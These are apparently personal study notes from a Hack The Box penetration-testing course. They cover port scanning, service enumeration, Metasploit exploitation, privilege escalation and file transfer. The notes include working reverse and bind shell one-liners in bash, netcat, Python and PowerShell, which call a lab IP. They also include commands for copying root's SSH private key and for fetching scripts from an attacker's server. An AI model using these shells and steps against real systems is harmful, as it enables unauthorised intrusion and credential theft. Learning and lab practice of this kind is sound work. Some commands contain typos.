## [Service Scanning](https://academy.hackthebox.com/module/77/section/726)

To access a service remotely, we need to connect using the correct IP address and port number and use a language that the service understands.	

Nmap is a tool to scan a server (ip address) and detect which ports are available and what service is running on each open port.

```
nmap <ip> 		# scans 1,000 most common ports
nmap -sV <ip> 	# if a port is open then gets the version of the service running on the 				# port.
	-p-			# scans all 65,535 TCP ports
	-sC			# more detailed info using scripts
# all together; scan all TPC ports with most common scripts and get details
nmap -sV -sC -p- <ip>

# run nmap with a specific script on a specific port:
nmap --script <script name> -p<port> <ip>

# trys to get the service banner:
namp -sV --script=banner <ip>
```

## Attacking Network Services

We ran scans with `nmap` and found several open ports. Now we are ready to connect to those ports.

### Banner Grabbing 

is a useful technique to fingerprint a service quickly. 

Two methods for banner grabbing:

1. using Netcat:
   * `nc -nv <ip> <port>`
   * example usage: `np -nv 10.129.42.253 21` 
2.  using nmap:
   * `nmap -sV --script=banner -p21 10.10.10.0/24`

### FTP

```
ftp -p <ip>

#example:
ftp -p 10.129.42.253
```

### SMB (Server Message Block)

can connect using nmap and the smb-os-discovery.nse script:

```
nmap --script smb-os-discovery.nse -p445 10.10.10.40

# -A: Enable OS detection, version detection, script scanning, and traceroute
nmap -A -p445 10.10.10.40
```



### Shares

SMB allows users and administrators to share folders and make them accessible remotely by other users.

```
smbclient -N -L \\\\10.129.42.253
# -L flag specifies that we want to retrieve a list of available shares on the remote host
# -N flag suppresses the password prompt

Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

The `ls` command resulted in an access denied message, indicating that guest access is not permitted. Let us try again using credentials for the user bob (`bob:Welcome1`).

```
smbclient -U bob \\\\10.129.42.253\\users
```



### SNMP

two examples:

```
# Example 1
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"

# Example 2
snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

```
onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```



## Web Enumberation

### Directory/File Enumeration

Gobuster: performs DNS, vhost, directory, and public AWS S3 bucket  enumeration on a web server

```
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# for Kali:
gobuster dir -u http://94.237.57.115:47761 -w /usr/share/dnsrecon/dnsrecon/data/namelist.txt
```

### DNS Subdomain Enumeration

```
# installing SecLists from GitHub
git clone https://github.com/danielmiessler/SecLists
sudo apt install seclists -y

# add DNS Server such as 1.1.1.1 to /etc/resolv.conf

# now can enumerate subdomains using gobuster
obuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

## Web Enumeration Tips

### Banner Grabbing/Web Server Headers

```
curl -IL https://www.inlanefreight.com
```

Whatweb: extract the version of web servers, supporting frameworks, and applications

```
whatweb 10.10.10.121

whatweb --no-errors 10.10.10.0/24
```

### Certificates

### robots.txt

### Source Code



# [Public Exploits](https://academy.hackthebox.com/module/77/section/843)

## Finding Public Exploits

search for a service using google:

ex: windows 7 smb exploit

```
searchsploit openssh 7.2
```

Other online databases:

- https://www.exploit-db.com/
- https://www.rapid7.com/db/
- https://www.vulnerability-lab.com/

## Metasploit Primer

```
msfconsole
search exploit eternalblue # search metasploit for a particular service exploit
use exploit/windows/smb/sm17_010_psexec # load an exploit
show options
set RHOSTS 10.10.10.40
check
exploit
meterpreter > getuid
meterpreter > shell
C:\WINDOWS\system32>whoami
```



# [Types of Shells](https://academy.hackthebox.com/module/77/section/725)

## Reverse Shell

start a netcat listener for the shell to connect to:

```
nc -lvnp 1234
# -l	Listen mode, to wait for a connection to connect to us.
# -v	Verbose mode, so that we know when we receive a connection.
# -n	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
# -p 1234	Port number netcat is listening on, and the reverse connection should be sent to.
```

Reverse shell on a Linux maching:

```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Reverse shell on a Windows PowerShell:

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```



## Bind Shell

Different commands to start a bind shell on a target:

```
# bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

# powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

```

Once we have a shell running on our target we can connect to it using Netcat:

```
nc 10.10.10.1 1234
```



## Web Shell



# [Privilege Escalation](https://academy.hackthebox.com/module/77/section/844)

## PrivEsc Checklists

## Enumeration Scripts

## Kernel Exploits

## Vulnerable Software

## User Privileges

```
sudo -l # see commands user can run
sudo su - # switch to root user
sudo -u user /bin/echo Hello World! # run sudo command as another user
```



## Scheduled Tasks

## Exposed Credentials

## SSH Keys

```
# if can access /root/.ssh/id_rsa then can copy id_rsa file from terminal
cat /root/.ssh/id_rsa # copy this and paste it in a new text file on local machine
vim id_rsa # create text file on local machine and paste id_rsa text from target
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa # login as root on target

# if we have write access to /.ssh/ then we can place our own public key in target ssh director:

ssh-keygen -f key # this makes two files: key and key.pub
# then copy key.pub to the target and place it in /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key # now remote into the target as root
```

# [Transferring Files](https://academy.hackthebox.com/module/77/section/849)

## Using wget

```
# 1: start a python web server on our machine in the directory that contains the files we # want to transfer:
python3 -m http.server 8000

# 2: use wget on target machine to get files from our server
wget http://10.10.14.1:8000/linenum.sh

# or can use curl:
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

## Using SCP

```
# if we have ssh user credentials then can use scp
scp linenum.sh user@remotehost:/tmp/linenum/sh
```

## Using Base64

When cannot transfer a file (ie: firewall prevents file transfers) then can use Base64:

1. to convert the file to a string using Base64.

2. copy str to the target

3. use Base64 to convert string back to a file

4. check file integrity

   ```
   # encode a file named shell
   base64 shell -w 0
   
   # on target machine:
   echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
   
   file shell # check shell is a file
   md5sum shell # run on local machine to get the checksum
   md5sum shell # run on the target and check both md5sum values match.
   
   ```

   

gobuster - find hidden files and directories

nmap - scan ports

hydra - brute force login

nikto - scan website vulnerabilities

metasploit - gain a shell

nc (netcat) - network connections and protocols

Burp Suite - web application security testing

aircrack-ng - wireless network tool

sqlmap - sql injection vulnerabilities

john the ripper - test password security

wireshark - network analysis tool

set - social engineering toolkit
